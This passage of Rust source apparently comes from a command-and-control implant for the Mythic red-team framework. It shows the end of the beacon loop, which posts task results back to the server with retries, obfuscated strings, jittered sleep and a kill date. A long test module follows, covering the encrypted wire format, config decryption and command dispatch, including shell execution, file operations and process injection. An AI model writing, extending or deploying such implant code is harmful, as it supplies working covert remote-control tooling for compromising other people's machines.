                responses.push(TaskResponse {
                    task_id: task.id.clone(),
                    completed: true,
                    user_output: Some(output),
                    status: if is_error {
                        Some("error".to_string())
                    } else {
                        None
                    },
                    download: None,
                    upload: None,
                    processes: None,
                    file_browser: None,
                });
                continue;
            }

            let result = dispatch(&task.command, &task.parameters);
            let is_error = result.text.starts_with("[-]");
            responses.push(TaskResponse {
                task_id: task.id.clone(),
                completed: true,
                user_output: Some(result.text),
                status: if is_error {
                    Some("error".to_string())
                } else {
                    None
                },
                download: None,
                upload: None,
                processes: result.processes,
                file_browser: result.file_browser,
            });
        }

        let pr_action = obfstr::obfstr!("post_response").to_string();
        let post_resp = PostResponseMessage {
            action: &pr_action,
            responses,
        };
        let post_json = serde_json::to_string(&post_resp).unwrap_or_default();
        let post_msg = build_mythic_message(&callback_id, &post_json, &encryption_key);

        // Bug #5: retry the final post_response instead of discarding the result.
        // If Mythic is unreachable or returns an error between get_tasking and
        // this response, the task results would be silently lost. Retry a few
        // times with a short backoff so transient failures don't drop output.
        let mut post_attempts = 0u8;
        while post_attempts < 3 {
            let send_result = client
                .post(&format!("{}{}", base, uri))
                .content_type("application/octet-stream")
                .send(&post_msg);
            if send_result.is_ok() {
                break;
            }
            post_attempts += 1;
            if post_attempts < 3 {
                sleep_with_jitter(2, 25);
            }
        }

        if should_exit {
            encryption_key.zeroize();
            return;
        }

        sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
    }

    encryption_key.zeroize();
}

// ── Tests ──────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::dispatch::dispatch_common;
    use std::sync::Mutex;

    // The sleep/jitter/kill-date state lives in process-wide static atomics.
    // Tests that read or write that state must hold this lock so they don't
    // race each other when cargo runs tests in parallel (observed flake in
    // CI: test_sleep_jitter_clamped_to_100 saw a concurrent reset to 0).
    static GLOBAL_STATE_LOCK: Mutex<()> = Mutex::new(());

    fn test_key() -> [u8; 32] {
        use sha2::{Digest, Sha256};
        let mut h = Sha256::new();
        h.update(b"test-secret");
        let hash = h.finalize();
        let mut key = [0u8; 32];
        key.copy_from_slice(&hash);
        key
    }

    #[test]
    fn test_mythic_wire_roundtrip() {
        let key = test_key();
        let uuid = "a1b2c3d4-e5f6-7890-abcd-ef1234567890";
        let payload = r#"{"action":"get_tasking","tasking_size":-1}"#;

        let wire = build_mythic_message(uuid, payload, &key);
        assert!(!wire.is_empty());

        let recovered = parse_mythic_message(&wire, &key).unwrap();
        assert_eq!(recovered, payload);
    }

    #[test]
    fn test_mythic_wire_wrong_key_returns_none() {
        let key = test_key();
        let mut wrong_key = [0u8; 32];
        wrong_key[0] = 0xFF;
        let uuid = "a1b2c3d4-e5f6-7890-abcd-ef1234567890";

        let wire = build_mythic_message(uuid, "hello", &key);
        assert!(parse_mythic_message(&wire, &wrong_key).is_none());
    }

    #[test]
    fn test_config_roundtrip() {
        let key = test_key();
        let addr = "192.168.1.10:443";

        let enc = encrypt_config(addr, &key);
        let dec = decrypt_config(&enc, &key).unwrap();
        assert_eq!(dec, addr);
    }

    #[test]
    fn test_decode_aes_key() {
        use base64::{engine::general_purpose::STANDARD, Engine as _};
        let key = [42u8; 32];
        let b64 = STANDARD.encode(key);
        let decoded = decode_aes_key(&b64).unwrap();
        assert_eq!(decoded, key);
    }

    #[test]
    fn test_decode_aes_key_invalid_length() {
        use base64::{engine::general_purpose::STANDARD, Engine as _};
        let short = STANDARD.encode([0u8; 16]);
        assert!(decode_aes_key(&short).is_none());
    }

    // ── Regression: extract_param (QUAL-05, BUG-04) ──────────────────────────
    //
    // QUAL-05: extract_param previously returned the raw JSON blob when the key
    // was absent, causing silent downstream errors (raw JSON passed as a file
    // path, a sleep duration, etc.). It must now return "".
    //
    // BUG-04: Go ↔ Rust parameter mismatch. sleep/inject sent a single "args"
    // string while Rust looked up "seconds"/"pid". extract_param is the bridge
    // between Mythic's JSON parameters and the handlers, so its contract must
    // be rock-solid.

    #[test]
    fn test_extract_param_string_value() {
        assert_eq!(extract_param(r#"{"path": "/tmp"}"#, "path"), "/tmp");
    }

    #[test]
    fn test_extract_param_number_value() {
        // Mythic serializes numbers as JSON floats (see Phase 17.3).
        assert_eq!(extract_param(r#"{"seconds": 30}"#, "seconds"), "30");
        assert_eq!(extract_param(r#"{"seconds": 30.0}"#, "seconds"), "30.0");
    }

    #[test]
    fn test_extract_param_missing_key_returns_empty() {
        // QUAL-05: must return "" (not the raw JSON).
        assert_eq!(extract_param(r#"{"other": "/tmp"}"#, "path"), "");
    }

    #[test]
    fn test_extract_param_invalid_json_returns_empty() {
        // Non-JSON input (e.g. a plain "30 10" string from a CLI parse path).
        // The docstring claims a fallback to the raw string; the actual fixed
        // behaviour returns "" (QUAL-05). Pin the real behaviour.
        assert_eq!(extract_param("not json at all", "path"), "");
        assert_eq!(extract_param("30 10", "seconds"), "");
    }

    #[test]
    fn test_extract_param_empty_input() {
        assert_eq!(extract_param("", "path"), "");
    }

    // ── Regression: handle_sleep_command (RS-02, QUAL-04) ────────────────────
    //
    // RS-02: handle_sleep_command panicked on whitespace-only input because
    // parts[0] was accessed on an empty Vec. split_whitespace().collect() now
    // yields an empty Vec and the early-return guard handles it.
    //
    // QUAL-04: sleep used float math with precision/edge-case issues; it now
    // parses as f64 then casts. Pin the observable behaviour.

    fn reset_sleep_state() -> std::sync::MutexGuard<'static, ()> {
        let guard = GLOBAL_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        set_sleep_seconds(5);
        set_jitter_percent(0);
        guard
    }

    #[test]
    fn test_sleep_whitespace_only_does_not_panic() {
        // RS-02 regression guard.
        let _g = reset_sleep_state();
        let out = handle_sleep_command("   ");
        assert!(out.starts_with("sleep:"), "whitespace-only: {}", out);
        assert_eq!(get_sleep_seconds(), 5);
        assert_eq!(get_jitter_percent(), 0);
    }

    #[test]
    fn test_sleep_empty_input_shows_status() {
        let _g = reset_sleep_state();
        let out = handle_sleep_command("");
        assert!(out.starts_with("sleep:"));
    }

    #[test]
    fn test_sleep_sets_seconds_and_jitter() {
        let _g = reset_sleep_state();
        let out = handle_sleep_command("30 10");
        assert_eq!(get_sleep_seconds(), 30);
        assert_eq!(get_jitter_percent(), 10);
        assert!(out.starts_with("[+]"));
    }

    #[test]
    fn test_sleep_seconds_only() {
        let _g = reset_sleep_state();
        handle_sleep_command("42");
        assert_eq!(get_sleep_seconds(), 42);
        assert_eq!(get_jitter_percent(), 0);
    }

    #[test]
    fn test_sleep_negative_seconds_saturates_to_zero() {
        // QUAL-04: f64::parse("-5") succeeds, `as u64` saturates negatives to 0.
        // Document the pinned behaviour so a future "fix" to reject negatives is
        // a deliberate, test-updating decision rather than a silent change.
        let _g = reset_sleep_state();
        handle_sleep_command("-5");
        assert_eq!(get_sleep_seconds(), 0);
    }

    #[test]
    fn test_sleep_non_numeric_returns_usage() {
        let _g = reset_sleep_state();
        let out = handle_sleep_command("abc");
        assert!(out.starts_with("[-]"));
        // State unchanged.
        assert_eq!(get_sleep_seconds(), 5);
    }

    #[test]
    fn test_sleep_invalid_jitter_keeps_seconds() {
        let _g = reset_sleep_state();
        // Valid seconds, junk jitter: seconds set, jitter unchanged.
        handle_sleep_command("20 notanumber");
        assert_eq!(get_sleep_seconds(), 20);
        assert_eq!(get_jitter_percent(), 0);
    }

    #[test]
    fn test_sleep_jitter_clamped_to_100() {
        let _g = reset_sleep_state();
        handle_sleep_command("10 150");
        assert_eq!(get_jitter_percent(), 100);
    }

    // ── Regression: handle_killdate_command ─────────────────────────────────

    #[test]
    fn test_killdate_empty_shows_unset() {
        let _g = reset_sleep_state();
        set_kill_date(None);
        let out = handle_killdate_command("");
        assert_eq!(out, "no killdate set");
    }

    #[test]
    fn test_killdate_set_and_clear() {
        let _g = reset_sleep_state();
        set_kill_date(None);
        let out = handle_killdate_command("1700000000");
        assert_eq!(out, "[+] killdate: 1700000000");
        assert_eq!(get_kill_date(), Some(1700000000));

        let out = handle_killdate_command("clear");
        assert_eq!(out, "[+] killdate cleared");
        assert_eq!(get_kill_date(), None);
    }

    #[test]
    fn test_killdate_clear_case_insensitive() {
        let _g = reset_sleep_state();
        set_kill_date(Some(123));
        handle_killdate_command("CLEAR");
        assert_eq!(get_kill_date(), None);
    }

    #[test]
    fn test_killdate_invalid_returns_usage() {
        let _g = reset_sleep_state();
        set_kill_date(None);
        let out = handle_killdate_command("not-a-timestamp");
        assert!(out.starts_with("[-]"));
        assert_eq!(get_kill_date(), None);
    }

    #[test]
    fn test_killdate_shows_current_when_set() {
        let _g = reset_sleep_state();
        set_kill_date(Some(9999999999));
        let out = handle_killdate_command("");
        assert_eq!(out, "killdate: 9999999999");
        set_kill_date(None);
    }

    // ── Regression: should_exit (kill date enforcement) ─────────────────────
    //
    // Documents the pre-epoch / corrupted-clock edge case: if the system clock
    // is before UNIX_EPOCH, duration_since errors and should_exit returns false
    // (kill date silently bypassed). Pin this so the behaviour is explicit.

    #[test]
    fn test_should_exit_no_killdate() {
        let _g = reset_sleep_state();
        set_kill_date(None);
        assert!(!should_exit());
    }

    #[test]
    fn test_should_exit_future_killdate_not_expired() {
        let _g = reset_sleep_state();
        // Far-future timestamp: not expired.
        set_kill_date(Some(i64::MAX));
        assert!(!should_exit());
        set_kill_date(None);
    }

    #[test]
    fn test_should_exit_past_killdate_expired() {
        let _g = reset_sleep_state();
        // Timestamp in the past relative to any modern clock: expired.
        set_kill_date(Some(1));
        assert!(should_exit());
        set_kill_date(None);
    }

    // ── Regression: parse_mythic_message malformed input (GO-01) ────────────
    //
    // GO-01: encryptCallback previously returned plaintext on crypto failure.
    // The parse side must reject malformed/short/tampered blobs rather than
    // returning garbage. These guards prevent the implant from acting on a
    // forged or truncated server response.

    #[test]
    fn test_parse_mythic_message_too_short() {
        let key = test_key();
        // Well below the minimum (UUID 36 + IV 16 + 1 block 16 + HMAC 32 = 100).
        assert!(parse_mythic_message("aGVsbG8=", &key).is_none());
        assert!(parse_mythic_message("", &key).is_none());
    }

    #[test]
    fn test_parse_mythic_message_invalid_base64() {
        let key = test_key();
        assert!(parse_mythic_message("!!!not base64!!!", &key).is_none());
    }

    #[test]
    fn test_parse_mythic_message_tampered_ciphertext() {
        let key = test_key();
        let uuid = "a1b2c3d4-e5f6-7890-abcd-ef1234567890";
        let wire = build_mythic_message(uuid, "payload", &key);

        // Flip a byte in the base64-decoded blob: must fail HMAC verification.
        use base64::{engine::general_purpose::STANDARD, Engine as _};
        let mut blob = STANDARD.decode(&wire).unwrap();
        // Flip a ciphertext byte (offset 36 + 16 to land past the IV).
        let idx = 52.min(blob.len().saturating_sub(1));
        blob[idx] ^= 0xFF;
        let tampered = STANDARD.encode(&blob);
        assert!(parse_mythic_message(&tampered, &key).is_none());
    }

    #[test]
    fn test_parse_mythic_message_truncated_hmac() {
        let key = test_key();
        let uuid = "a1b2c3d4-e5f6-7890-abcd-ef1234567890";
        let wire = build_mythic_message(uuid, "payload", &key);

        // Drop the last 10 bytes of base64 → truncates the HMAC.
        let truncated = &wire[..wire.len() - 10];
        assert!(parse_mythic_message(truncated, &key).is_none());
    }

    // ── Regression: decrypt_config malformed input ──────────────────────────

    #[test]
    fn test_decrypt_config_invalid_hex() {
        let key = test_key();
        assert!(decrypt_config("not-hex!@#$", &key).is_none());
    }

    #[test]
    fn test_decrypt_config_too_short() {
        let key = test_key();
        // 32 hex chars = 16 bytes, below the IV(16)+block(16)+HMAC(32) minimum.
        assert!(decrypt_config("00112233445566778899aabbccddeeff", &key).is_none());
    }

    #[test]
    fn test_decrypt_config_wrong_key() {
        let key = test_key();
        let mut wrong = [0u8; 32];
        wrong[0] = 0xFF;
        let enc = encrypt_config("10.0.0.1:443", &key);
        assert!(decrypt_config(&enc, &wrong).is_none());
    }

    // ── Regression: split_first (used by inject parsing) ────────────────────

    #[test]
    fn test_split_first_two_parts() {
        let (cmd, args) = split_first("inject 1234 base64data");
        assert_eq!(cmd, "inject");
        assert_eq!(args, "1234 base64data");
    }

    #[test]
    fn test_split_first_extra_spaces_collapsed() {
        let (cmd, args) = split_first("inject    1234   data");
        assert_eq!(cmd, "inject");
        assert_eq!(args, "1234   data");
    }

    #[test]
    fn test_split_first_no_space() {
        let (cmd, args) = split_first("onlycommand");
        assert_eq!(cmd, "onlycommand");
        assert_eq!(args, "");
    }

    #[test]
    fn test_split_first_empty() {
        let (cmd, args) = split_first("");
        assert_eq!(cmd, "");
        assert_eq!(args, "");
    }

    // ── Regression: sleep_with_jitter edge cases (QUAL-04) ─────────────────
    //
    // These exercise the bounds without asserting on the random jitter value,
    // which is non-deterministic. We assert the function does not panic and
    // returns promptly for degenerate inputs.

    #[test]
    fn test_sleep_with_jitter_zero_base() {
        // base=0 short-circuits to sleep(0); must not divide by zero or panic.
        sleep_with_jitter(0, 50);
    }

    #[test]
    fn test_sleep_with_jitter_zero_jitter() {
        sleep_with_jitter(0, 0);
    }

    #[test]
    fn test_sleep_with_jitter_range_zero_when_base_small() {
        // base=1, jitter=1 → range = 1*1/100 = 0 → short-circuit to sleep(base).
        sleep_with_jitter(1, 1);
    }

    #[test]
    fn test_sleep_with_jitter_typical() {
        sleep_with_jitter(1, 23);
    }

    #[test]
    fn test_sleep_with_jitter_full_100_percent() {
        sleep_with_jitter(1, 100);
    }

    // ── Regression: expand_tilde ─────────────────────────────────────────────

    #[test]
    fn test_expand_tilde_plain_path_unchanged() {
        assert_eq!(expand_tilde("/tmp/foo"), "/tmp/foo");
        assert_eq!(expand_tilde("relative/path"), "relative/path");
    }

    #[test]
    fn test_expand_tilde_no_home_env_does_not_crash() {
        // We cannot reliably control $HOME in a unit test, but we can at least
        // confirm a non-tilde path is returned verbatim regardless of env.
        assert_eq!(expand_tilde("/etc/hostname"), "/etc/hostname");
    }

    // ── Regression: dispatch_common parameter extraction (BUG-08, BUG-12) ──
    //
    // BUG-08: dispatch was inconsistent across platforms (Linux used
    // extract_param directly, Windows/OSX went through a string re-parse that
    // lost JSON structure). dispatch_common now consumes (command, parameters)
    // and uses extract_param uniformly.
    //
    // BUG-12: shell/cmd/powershell dispatchers passed raw JSON to the shell.
    // The fix uses extract_param("command"). These tests verify dispatch_common
    // honours JSON parameters for the cross-platform commands it owns.

    #[test]
    fn test_dispatch_common_unknown_command_returns_none() {
        // Unknown commands must return None so platform code can handle them,
        // not silently fall through to shell execution.
        assert!(dispatch_common("totally_unknown_cmd", "{}").is_none());
        assert!(dispatch_common("totally_unknown_cmd", "").is_none());
    }

    #[test]
    fn test_dispatch_common_sleep_via_json_params() {
        // BUG-04 / BUG-08 regression: sleep must accept JSON {seconds, jitter}.
        let _g = reset_sleep_state();
        let out = dispatch_common("sleep", r#"{"seconds": 42, "jitter": 7}"#);
        let out = out.expect("sleep handled by dispatch_common");
        assert!(out.text.starts_with("[+]"));
        assert_eq!(get_sleep_seconds(), 42);
        assert_eq!(get_jitter_percent(), 7);
        let _g = reset_sleep_state();
    }

    #[test]
    fn test_dispatch_common_sleep_json_missing_jitter() {
        let _g = reset_sleep_state();
        let out = dispatch_common("sleep", r#"{"seconds": 42}"#);
        let out = out.expect("sleep handled");
        assert!(out.text.starts_with("[+]"));
        assert_eq!(get_sleep_seconds(), 42);
        // Jitter absent → extract_param returns "" → handle_sleep_command
        // gets "42 " which split_whitespace reduces to ["42"], jitter stays 0.
        assert_eq!(get_jitter_percent(), 0);
        let _g = reset_sleep_state();
    }

    #[test]
    fn test_dispatch_common_killdate_via_json() {
        let _g = reset_sleep_state();
        set_kill_date(None);
        let out = dispatch_common("killdate", r#"{"date": "1700000000"}"#);
        let out = out.expect("killdate handled");
        assert!(out.text.starts_with("[+]"));
        assert_eq!(get_kill_date(), Some(1700000000));
        set_kill_date(None);
    }

    #[test]
    fn test_dispatch_common_pwd() {
        let out = dispatch_common("pwd", "").expect("pwd handled");
        // Should be the current dir (non-empty) or an error message, but not a
        // panic and not the raw JSON.
        assert!(!out.text.is_empty());
    }

    #[test]
    fn test_dispatch_common_pid() {
        let out = dispatch_common("pid", "{}").expect("pid handled");
        assert_eq!(out.text, std::process::id().to_string());
    }

    #[test]
    fn test_dispatch_common_cp_missing_args_returns_usage_error() {
        // No "source"/"destination" keys → extract_param returns "" → usage error.
        let out = dispatch_common("cp", "{}").expect("cp handled");
        assert!(out.text.starts_with("[-]"));
    }

    #[test]
    fn test_dispatch_common_mv_missing_args_returns_usage_error() {
        let out = dispatch_common("mv", r#"{"source": "/tmp/a"}"#).expect("mv handled");
        assert!(out.text.starts_with("[-]"));
    }

    #[test]
    fn test_dispatch_common_rm_missing_path_returns_usage_error() {
        let out = dispatch_common("rm", "{}").expect("rm handled");
        assert!(out.text.starts_with("[-]"));
    }

    #[test]
    fn test_dispatch_common_mkdir_missing_path_returns_usage_error() {
        let out = dispatch_common("mkdir", "{}").expect("mkdir handled");
        assert!(out.text.starts_with("[-]"));
    }

    #[test]
    fn test_dispatch_common_execute_missing_command_returns_usage_error() {
        // No "command" key → extract_param returns "" → falls back to raw params
        // "{}" which split_whitespace reduces to empty → usage error.
        let out = dispatch_common("execute", "{}").expect("execute handled");
        assert!(out.text.starts_with("[-]"));
    }

    #[test]
    fn test_dispatch_common_cd_to_home_on_empty_path() {
        // Empty path → target defaults to "~" → expand_tilde. Whether it
        // succeeds depends on $HOME; we only assert it does not panic and
        // returns a non-empty result.
        let out = dispatch_common("cd", "{}").expect("cd handled");
        assert!(!out.text.is_empty());
    }

    #[test]
    fn test_dispatch_common_ls_empty_path_lists_cwd() {
        // Empty path → list_dir_browser(".") → should not error on cwd.
        let out = dispatch_common("ls", "{}").expect("ls handled");
        // Either a listing or an error message, but must not panic and must
        // populate the file_browser field.
        assert!(out.file_browser.is_some());
    }
}
